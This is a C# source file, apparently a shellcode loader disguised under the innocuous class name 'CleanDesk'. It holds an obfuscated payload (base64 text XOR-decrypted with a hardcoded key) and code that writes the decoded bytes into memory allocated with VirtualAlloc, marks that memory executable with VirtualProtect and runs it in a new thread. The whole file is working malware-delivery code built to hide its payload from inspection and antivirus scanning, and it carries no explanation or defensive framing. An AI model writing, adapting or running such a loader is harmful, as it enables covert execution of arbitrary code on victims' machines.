using System;
using System.Runtime.InteropServices;
using System.Text;
public class CleanDesk
{
    private static UInt32 MEM_COMMIT = 0x1000;
    private static UInt32 PAGE_READWRITE = 0x04;
    private static UInt32 PAGE_EXECUTE_READ = 0x20;
    [DllImport("kernel32")]
    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr address, UInt32 size, UInt32 newProtect, out UInt32 oldProtect);
    [DllImport("kernel32")]
    private static extern IntPtr CreateThread(
        UInt32 lpThreadAttributes,
        UInt32 dwStackSize,
        UInt32 lpStartAddress,
        IntPtr param,
        UInt32 dwCreationFlags,
        ref UInt32 lpThreadId
    );
    [DllImport("kernel32")]
    private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    public void WatchThis() {
        string raw = @"HgEtDnI2DSIgeRsoCiYHUhlDD0dYfw0AWkYFNhADPCsDciFyOhgGH0MKPCVVNgUQMH09FAMUDXFEBARjZ3owHnY+OCgpeQEJAh0vUyMzBmJkFzAXejYENxAAHh1zPzVzGQgdfHAqHTUcQTYhA0dFBj8/L14UFBd0VygjelUkHlJMdhwIEAYUe0BAL3x1CzEBZDU7IUkEBgEuMg1oGScfW3sIMC9qISACLFZaIx90fFgZCgJCWxh1IlEaGlM4dx13JhJwSSY1Jn1VNx0FHE4ZG0sBOxASdAttETY+Z1QvImICIQI3GFc7EBJ3LGACIw9xBwYJD3I2DRUYdR0lEhMLaSIZFARkGxIPVxooKyEBFj0iEj1/ISR3R1N9LANhMXUMHXQdLxQoMggRJgcEUwseAGVGBic0ZSMeJAEICRMIGH9rGgoHZBwCURhcETcTLnEIERgYX1UbfQVqRQFXGnVMcBAodHUlNzZ5Yzd0OmccClcbZw00JncTfxMnFANoIzB9ViEgNhtKLwETLjFYETQbRH8GKA9hGS9SG1w/KyQAMXYUQBxyVAs8P1YZFiY3XUV3EQAhdyFBCAJlJA4VUkYBGzVnHQkQAR98Jh4Ud1MLCjVpR3knKnU/PRN1AEMTJxR+ZSAnN2AxdTM0Whl2JSs1ahUff35TfzQhZSEoVyADIz0JAHxKJDYEfGt9AX1RIB0aLGYnLSMRA3cUNAhKVRYsD1IiKDovYTcVJgMgcx5KLB8AFyoKZkUrIjRFNgESdAttJkMAZ1ABMBt/HTpMSGovNQQpfFYXNgNxcAcqKlIQHjIYWEwTJg0Tfh4dLB8AGAoZZkYCNBhzRQMADTMWQSsWcVUcFiJaNQEiOHcdAX8BHV5fSxhgVS13Imc2DSI4dwUFJgQEaDEzDF9wDwYMcjECDC57JxByI2pvG0MAZFgrIBVSNg0EOHE3EBEoImocHSBZHncTC0Q/GDMQRxYGMHEdeBQXGGlGf2siUlhjTFZKMHEIFnFAPRglRXwkFXh/HQkZN2E2c38JElAmHyFxZGFrGw==";
        byte[] shellcode = Convert.FromBase64String(pjladd("1NDM3wLcy0uDGEE9prN0", Base64Decode(raw)));
        UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
        Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
        UInt32 oldProtect;
        VirtualProtect((IntPtr)(funcAddr), (UInt32)shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);
        IntPtr hThread = IntPtr.Zero;
        UInt32 threadId = 0;
        IntPtr pinfo = IntPtr.Zero;
        hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }

    public static string pjladd(string key, string input)
    {
        StringBuilder sb = new StringBuilder();
        for(int i=0; i < input.Length; i++)
            sb.Append((char)(input[i] ^ key[(i % key.Length)]));
        String result = sb.ToString();
        return result;
    }

    public static string Base64Encode(string text) {
       return System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(text));
    }

    public static string Base64Decode(string encodedtext) {
	    return System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(encodedtext));
    }
}